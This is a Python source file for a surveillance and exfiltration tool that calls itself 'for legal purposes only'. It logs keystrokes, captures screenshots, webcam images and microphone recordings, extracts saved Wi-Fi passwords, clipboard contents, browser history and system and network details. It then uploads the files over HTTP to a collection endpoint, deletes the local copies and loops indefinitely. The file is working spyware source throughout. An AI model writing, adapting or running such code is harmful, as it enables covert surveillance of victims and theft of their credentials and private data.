
"""
This tool may be used for legal purposes only.
Users take full responsibility for any actions performed using this tool.
The author accepts no liability for damage caused by this tool.
If these terms are not acceptable to you, then do not use this tool.

 Built-in Modules """
import json
import logging
import os
import re
import shutil
import socket
import sys
import time
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
import psutil
import datetime
# External Modules #

import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
import pyscreenshot
import pyscreenshot as screen_capture
from PIL import ImageGrab
from pynput.keyboard import Listener
from browser_history.utils import default_browser
import subprocess
import os
import re
from collections import namedtuple
import configparser

# If the OS is Windows #
if os.name == 'nt':
    import win32clipboard


def get_windows_saved_ssids():
    """Returns a list of saved SSIDs in a Windows machine using netsh command"""
    # get all saved profiles in the PC
    output = subprocess.check_output("netsh wlan show profiles").decode()
    ssids = []
    profiles = re.findall(r"All User Profile\s(.*)", output)
    for profile in profiles:
        # for each SSID, remove spaces and colon
        ssid = profile.strip().strip(":").strip()
        # add to the list
        ssids.append(ssid)
    return ssids

def get_windows_saved_wifi_passwords(verbose=1):
    """Extracts saved Wi-Fi passwords saved in a Windows machine, this function extracts data using netsh
    command in Windows
    Args:
        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
    Returns:
        [list]: list of extracted profiles, a profile has the fields ["ssid", "ciphers", "key"]
    """
    ssids = get_windows_saved_ssids()
    if os.name == 'nt':
        export_path = Path('C:\\Tmp\\')
    # If the OS is Linux #
    else:
        export_path = Path('/tmp/logs/')
    wifi_path = export_path / 'wifi_info.txt'
    Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
    profiles = []
    for ssid in ssids:
        ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
        # get the ciphers
        ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
        # clear spaces and colon
        ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
        # get the Wi-Fi password
        key = re.findall(r"Key Content\s(.*)", ssid_details)
        # clear spaces and colon
        try:
            key = key[0].strip().strip(":").strip()
        except IndexError:
            key = "None"
        profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
        if verbose >= 1:
            print_windows_profile(profile)
        profiles.append(profile)
    return profiles

def print_windows_profile(profile):
    """Prints a single profile on Windows"""
    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")


def print_windows_profiles(verbose):
    """Prints all extracted SSIDs along with Key on Windows"""
    print("SSID                     CIPHER(S)      KEY")
    print("-"*50)
    get_windows_saved_wifi_passwords(verbose)
    
def wifi_password(verbose=1):   
    """Extracts saved Wi-Fi passwords saved in a Linux machine, this function extracts data in the
    `/etc/NetworkManager/system-connections/` directory
    Args:
        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
    Returns:
        [list]: list of extracted profiles, a profile has the fields ["ssid", "auth-alg", "key-mgmt", "psk"]
    """
    network_connections_path = "/etc/NetworkManager/system-connections/"
    if os.name == 'nt':
        export_path = Path('C:\\Tmp\\')
    # If the OS is Linux #
    else:
        export_path = Path('/tmp/logs/')
    wifi_path = export_path / 'wifi_info.txt'
    fields = ["ssid", "auth-alg", "key-mgmt", "psk"]
    Profile = namedtuple("Profile", [f.replace("-", "_") for f in fields])
    profiles = []
    for file in os.listdir(network_connections_path):
        data = { k.replace("-", "_"): None for k in fields }
        config = configparser.ConfigParser()
        config.read(os.path.join(network_connections_path, file))
        for _, section in config.items():
            for k, v in section.items():
                if k in fields:
                    data[k.replace("-", "_")] = v
        profile = Profile(**data)
        if verbose >= 1:
            print_linux_profile(profile)
        profiles.append(profile)
    file = open(wifi_path,'w')
    for item in profiles:
        file.write(str(item))
        
    return profiles


def print_linux_profile(profile):
    """Prints a single profile on Linux"""
    print(f"{str(profile.ssid):25}{str(profile.auth_alg):5}{str(profile.key_mgmt):10}{str(profile.psk):50}") 


def print_linux_profiles(verbose):
    """Prints all extracted SSIDs along with Key (PSK) on Linux"""
    print("SSID                     AUTH KEY-MGMT  PSK")
    print("-"*50)
    wifi_password(verbose)
    
    






def send_info(path: Path, re_obj: object):
    """                 

    :param path:  The file path containing the files to be attached to the api.
    :param re_obj:  Compiled regex instance containing precompiled patterns for file extensions.
    :return:  Nothing
    """
    # User loging information #

    # Iterate through files of passed in directory #
    for file in os.scandir(str(path.resolve())):
        # If current item is dir #
        if os.path.isdir(file.name):
            continue

        # If the file matches file extension regex's #
        if re_obj.re_xml.match(file.name) or re_obj.re_txt.match(file.name) \
        or re_obj.re_png.match(file.name) or re_obj.re_jpg.match(file.name):
            attach_file = path / file.name
            test_file = open(attach_file, "rb")
            test_url = "http://127.0.0.1:8000/"
            test_response = requests.post(test_url, files = {"fo": test_file,"name":file.name},json={"name":"ddd"})
            if test_response.ok:
                print("Upload completed successfully!")
                print(test_response.text)
            else:
                print("Something went wrong!")
        elif re_obj.re_audio.match(file.name):
            attach_file = path / file.name
            test_file = open(attach_file, "rb")
            test_url = "http://127.0.0.1:8000/"
            test_response = requests.post(test_url, files = {"fo": test_file,"name":file.name},json={"name":"ddd"})
            if test_response.ok:
                print("Upload completed successfully!")
                print(test_response.text)
            else:
                print("Something went wrong!")


def encrypt_data(files: list, export_path: Path):
    """
    Encrypts all the file data in the parameter list of files to be exfiltrated.

    :param files:  List of files to be encrypted.
    :param export_path:  The file path where the files to be encrypted reside.
    :return:  Nothing
    """
    # In the python console type: from cryptography.fernet import Fernet ; then run the command
    # below to generate a key. This key needs to be added to the key variable below as
    # well as in the DecryptFile.py that should be kept on the exploiter's system. If either
    # is forgotten either encrypting or decrypting process will fail. #
    # Command -> Fernet.generate_key()
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    # Iterate through files to be encrypted #
    for file in files:
        # Format plain and crypt file paths #
        file_path = export_path / file
        crypt_path = export_path / f'e_{file}'
        try:
            # Read the file plain text data #
            with file_path.open('rb') as plain_text:
                data = plain_text.read()

            # Encrypt the file data #
            encrypted = Fernet(key).encrypt(data)

            # Write the encrypted data to fresh file #
            with crypt_path.open('wb') as hidden_data:
                hidden_data.write(encrypted)

            # Delete the plain text data #
            os.remove(str(file_path.resolve()))

        # If error occurs during file operation #
        except (IOError, OSError) as file_err:
            print_err(f'Error occurred during file operation: {file_err}')
            logging.exception('Error occurred during file operation: %s\n', file_err)


class RegObject:
    """
    Regex object that contains numerous compiled expressions grouped together.
    """
    def __init__(self):
        # Compile regex's for attaching files #
        self.re_xml = re.compile(r'.{1,255}\.xml$')
        self.re_txt = re.compile(r'.{1,255}\.txt$')
        self.re_png = re.compile(r'.{1,255}\.png$')
        self.re_jpg = re.compile(r'.{1,255}\.jpg$')
        # If the OS is Windows #
        if os.name == 'nt':
            self.re_audio = re.compile(r'.{1,255}\.wav$')
        # If the OS is Linux #
        else:
            self.re_audio = re.compile(r'.{1,255}\.wav$')


def webcam(webcam_path: Path):
    """
    Captures webcam pictures every five seconds.

    :param webcam_path:  The file path where the webcam pictures will be stored.
    :return:  Nothing
    """
    # Create directory for webcam picture storage #
    Path(str(webcam_path.resolve())).mkdir(parents=True, exist_ok=True)
    # Initialize video capture instance #
    cam = cv2.VideoCapture(0)

    for current in range(1, 61):
        # Take picture of current webcam view #
        ret, img = cam.read()

        # If image was captured #
        if ret:
            # Format output webcam path #
            file_path = webcam_path / f'{current}_webcam.jpg'
            # Save the image to as file #
            cv2.imwrite(str(file_path.resolve()), img)

        # Sleep process 5 seconds #
        time.sleep(5)

    # Release camera control #
    cam.release()
    cv2.destroyAllWindows

def microphone(mic_path: Path):
    """
    Actively records microphone in 60 second intervals.

    :param mic_path:  The file path where the microphone recordings will be stored.
    :return:  Nothing
    """
    # Import sound recording module in private thread #
    from scipy.io.wavfile import write as write_rec
    # Set recording frames-per-second and duration #
    frames_per_second = 44100
    seconds = 60

    for current in range(1, 6):
        # If the OS is Windows #
        if os.name == 'nt':
            channel = 2
            rec_name = mic_path / f'{current}mic_recording.wav'
        # If the OS is Linux #
        else:
            channel = 1
            rec_name = mic_path / f'{current}mic_recording.wav'

        # Initialize instance for microphone recording #
        my_recording = sounddevice.rec(int(seconds * frames_per_second),
                                       samplerate=frames_per_second, channels=channel)
        # Wait time interval for the mic to record #
        sounddevice.wait()

        # Save the recording as proper format based on OS #
        write_rec(str(rec_name.resolve()), frames_per_second, my_recording)


def screenshot(screenshot_path: Path):
    """
    Captured screenshots every five seconds.

    :param screenshot_path:  The file path where the screenshots will be stored.
    :return:  Nothing
    """
    # Create directory for screenshot storage #
    Path(str(screenshot_path.resolve())).mkdir(parents=True, exist_ok=True)

    for current in range(1, 61):
        # Capture screenshot #
        pic = screen_capture.grab()
        # Format screenshot output path #
        capture_path = screenshot_path / f'{current}_screenshot.png'
        # Save screenshot to file #
        pic.save(str(capture_path.resolve()))
        # Sleep 5 seconds per iteration #
        time.sleep(5)


def log_keys(key_path: Path):
    """
    Detect and log keys pressed by the user.

    :param key_path:  The file path where the pressed key logs will be stored.
    :return:  Nothing
    """
    # Set the log file and format #
    logging.basicConfig(filename=str(key_path.resolve()), level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')
    # Join the keystroke listener thread #
    with Listener(on_press=lambda key: logging.info(str(key))) as listener:
        listener.join()


def get_browser_history(browser_file: Path):
    """
    Get the browser username, path to browser databases, and the entire browser history.

    :param browser_file:  Path to the browser info output file.
    :return:  Nothing
    """
    from browser_history import get_history

    outputs = get_history()


    try:
        # Write the results to output file in json format #
        outputs.save(browser_file,output_format="json")

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during browser history file operation: %s\n', file_err)

def get_shutdown_loggedin(loggedin_file: Path):
    """
    Get the system loggin time and shutdown time.

    :param loggedin_file:  Path to the loggenin info output file.
    :return:  Nothing
    """
  

    try:
        shutdown_output = subprocess.check_output(["last", "-x", "-d"]).decode()
        shutdown_time = shutdown_output.splitlines()[0].split()[-2] + " " + shutdown_output.splitlines()[0].split()[-1]

        # Get the startup time
        startup_output = subprocess.check_output(["last", "-x", "-d", "-F"]).decode()
        startup_time = startup_output.splitlines()[0].split()[-2] + " " + startup_output.splitlines()[0].split()[-1]

    # Save the times to a file
        with open(loggedin_file, "w") as file:
            file.write("Last shutdown time: " + shutdown_time + "\n")
            file.write("Last startup time: " + startup_time + "\n")

        print("Times saved to times.txt")
    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during browser history file operation: %s\n', file_err)


def get_clipboard(export_path: Path):
    """
    Gathers the clipboard contents and writes the output to the clipboard output file.

    :param export_path:  The file path where the data to be exported resides.
    :return:  Nothing
    """
    try:
        # Access the clipboard #
        win32clipboard.OpenClipboard()
        # Copy the clipboard data #
        pasted_data = win32clipboard.GetClipboardData()

    except (OSError, TypeError):
        pasted_data = ''

    finally:
        # Close the clipboard #
        win32clipboard.CloseClipboard()

    clip_path = export_path / 'clipboard_info.txt'
    try:
        # Write the clipboard contents to output file #
        with clip_path.open('w', encoding='utf-8') as clipboard_info:
            clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)


def get_system_info(sysinfo_file: Path):
    """
    Runs an array of commands to gather system and hardware information. All the output is \
    redirected to the system info output file.

    :param sysinfo_file:  The path to the output file for the system information.
    :return:  Nothing
    """
    try:
        with sysinfo_file.open('a', encoding='utf-8') as system_info:
            # If the OS is Windows #
            if os.name == 'nt':
                syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
            # If the OS is Linux #
            else:
                cmd0 = 'hostnamectl'
                cmd1 = 'lscpu'
                cmd2 = 'lsmem'
                cmd3 = 'lsusb'
                cmd4 = 'lspci'
                cmd5 = 'lshw'
                cmd6 = 'lsblk'
                cmd7 = 'df -h'

                syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}'

            with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
                try:
                    get_sysinfo.communicate(timeout=30)

                except TimeoutExpired:
                    get_sysinfo.kill()
                    get_sysinfo.communicate()

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)


def linux_wifi_query(export_path: Path):
    """
    Runs nmcli commands to query a list of Wi-Fi SSID's that the system has encountered. The SSID \
    list is then iterated over line by line to query for each profile include passwords. All the \
    output is redirected to the Wi-Fi info output file.

    :param export_path:  The file path where the data to be exported resides.
    :return:  Nothing
    """
    # Format wifi output file path #
    wifi_path = export_path / 'wifi_info.txt'
    try:
        # Open the network SSID list file in write mode #
       if os.name == "nt":
          print_windows_profiles(verbose=1)
       elif os.name == "posix":
          print_linux_profiles(verbose=1)
       else:
          raise NotImplemented("Code only works for either Linux or Windows")

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)
  

def get_network_info(export_path: Path, network_file: Path):
    """
    Runs an array of commands to query network information, such as network profiles, passwords, \
    ip configuration, arp table, routing table, tcp/udp ports, and attempt to query the ipify.org \
    API for public IP address. All the output is redirected to the network info output file.

    :param export_path:  The file path where the data to be exported resides.
    :param network_file:  A path to the file where the network information output is stored.
    :return:  Nothing
    """

    try:
        # Open the network information file in write mode and log file in write mode #
        with network_file.open('w', encoding='utf-8') as network_io:
            # If the OS is Windows #
            if os.name == 'nt':
                # Get the saved Wi-Fi network information, IP configuration, ARP table,
                # MAC address, routing table, and active TCP/UDP ports #
                syntax = ['Netsh', 'WLAN', 'export', 'profile',
                          f'folder={str(export_path.resolve())}',
                          'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
                          'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
            # If the OS is Linux #
            else:
                # Get the Wi-Fi network information #
                linux_wifi_query(export_path)

                cmd0 = 'ifconfig'
                cmd1 = 'arp -a'
                cmd2 = 'route'
                cmd3 = 'netstat -a'

                # Get the IP configuration & MAC address, ARP table,
                # routing table, and active TCP/UDP ports #
                syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}'

            with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
                try:
                    # Execute child process #
                    commands.communicate(timeout=60)

                # If execution timeout occurred #
                except TimeoutExpired:
                    commands.kill()
                    commands.communicate()

            # Get the hostname #
            hostname = socket.gethostname()
            # Get the IP address by hostname #
            ip_addr = socket.gethostbyname(hostname)

            try:
                # Query ipify API to retrieve public IP #
                public_ip = requests.get('https://api.ipify.org').text

            # If error occurs querying public IP #
            except requests.ConnectionError as conn_err:
                public_ip = f'* Ipify connection failed: {conn_err} *'

            # Log the public and private IP address #
            network_io.write(f'[!] Public IP Address: {public_ip}\n'
                             f'[!] Private IP Address: {str(ip_addr)}\n')

    # If error occurs during file operation #
    except (OSError, IOError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)



def monitor_apps(running_apps_file: Path):
    """
    running a loop that monitor system running app using psutil ,the reason for the loop is to make sure that the keylogger can detect when the app is closed due to the system itself did not store the closed time
    """
    # Get the initial list of running processes
    processes = {}
    for proc in psutil.process_iter(['pid', 'name', 'create_time']):
        try:
            pinfo = proc.as_dict(attrs=['pid', 'name', 'create_time'])
            processes[pinfo['pid']] = {'name': pinfo['name'], 'start_time': datetime.datetime.fromtimestamp(pinfo['create_time'])}
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    # Continuously monitor for new or ended processes
    while True:
        new_processes = {}
        ended_processes = []
        for proc in psutil.process_iter(['pid', 'name', 'create_time']):
            try:
                pinfo = proc.as_dict(attrs=['pid', 'name', 'create_time'])
                if pinfo['pid'] not in processes:
                    new_processes[pinfo['pid']] = {'name': pinfo['name'], 'start_time': datetime.datetime.fromtimestamp(pinfo['create_time'])}
                else:
                    processes[pinfo['pid']] = {'name': pinfo['name'], 'start_time': processes[pinfo['pid']]['start_time']}
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        # Update the processes dictionary with new processes
        processes.update(new_processes)

        # Check for ended processes
        for pid, info in list(processes.items()):
            if pid not in [p.pid for p in psutil.process_iter()]:
                ended_processes.append((info['name'], info['start_time'], datetime.datetime.now()))
                del processes[pid]

        if new_processes:
            with open(running_apps_file, 'a') as f:
                f.write(f'New processes: {new_processes}\n')
        if ended_processes:
            with open(running_apps_file, 'a') as f:
                f.write(f'Ended processes: {ended_processes}\n')
def main():
    """
    Gathers network information, clipboard contents, browser history, initiates multiprocessing, \
    sends encrypted results, cleans up exfiltrated data, and loops back to the beginning.

    :return:  Nothing
    """
    # If the OS is Windows #
    if os.name == 'nt':
        export_path = Path('C:\\Tmp\\')
    # If the OS is Linux #
    else:
        export_path = Path('/tmp/logs/')

    # Ensure the tmp exfiltration dir exists #
    Path(str(export_path.resolve())).mkdir(parents=True, exist_ok=True)
    # Format program files and dirs #
    network_file = export_path / 'network_info.txt'
    sysinfo_file = export_path / 'system_info.txt'
    browser_file = export_path / 'browser_info.txt'
    loggedin_file = export_path / 'shutdown_and_loggedin_info.txt'
    log_file = export_path / 'key_logs.txt'
    running_apps_file = export_path / 'running_app.txt'
    screenshot_dir = export_path / 'Screenshots'
    webcam_dir = export_path / 'WebcamPics'

    # Get the network information and save to output file #
    get_network_info(export_path, network_file)
    get_shutdown_loggedin(loggedin_file)

    # Get the system information and save to output file #
    get_system_info(sysinfo_file)

    # If OS is Windows #
    if os.name == 'nt':
        # Get the clipboard contents and save to output file #
        get_clipboard(export_path)

    # Get the browser user and history and save to output file #
    get_browser_history(browser_file)

    # Create and start processes #
    proc_1 = Process(target=log_keys, args=(log_file,))
    proc_1.start()
    proc_2 = Thread(target=screenshot, args=(screenshot_dir,))
    proc_2.start()
    proc_3 = Thread(target=microphone, args=(export_path,))
    proc_3.start()
    proc_4 = Thread(target=webcam, args=(webcam_dir,))
    proc_4.start()
    proc_5 = Thread(target=monitor_apps, args=(running_apps_file,))
    proc_5.start()

    # Join processes/threads with 5 minute timeout #
    proc_1.join(timeout=300)
    proc_2.join(timeout=300)
    proc_3.join(timeout=300)
    proc_4.join(timeout=300)
    proc_5.join(timeout=300)

    # Terminate process #
    proc_1.terminate()

    files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt','running_app.txt','shutdown_and_loggedin_info.txt']

    # Initialize compiled regex instance #
    regex_obj = RegObject()

    # If the OS is Windows #
    if os.name == 'nt':
        # Add clipboard file to list #
        files.append('clipboard_info.txt')
        files.append('wifi_info.txt')

        # Append file to file list if item is file and match xml regex #
        [files.append(file.name) for file in os.scandir(str(export_path.resolve()))
         if regex_obj.re_xml.match(file.name)]
    # If the OS is Linux #
    else:
        files.append('wifi_info.txt')

    # Encrypt all the files in the files list #
    #encrypt_data(files, export_path)

    # Export data via api #
    send_info(export_path, regex_obj)
    send_info(screenshot_dir, regex_obj)
    send_info(webcam_dir, regex_obj)

    # Clean Up Files #
    shutil.rmtree(str(export_path.resolve()))
    # Loop #
    main()


def print_err(msg: str):
    """
    Displays the passed in error message via stderr.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


if __name__ == '__main__':
    try:
        main()

    # If Ctrl + C is detected #
    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    # If unknown exception occurs #
    except Exception as ex:
        print_err(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)
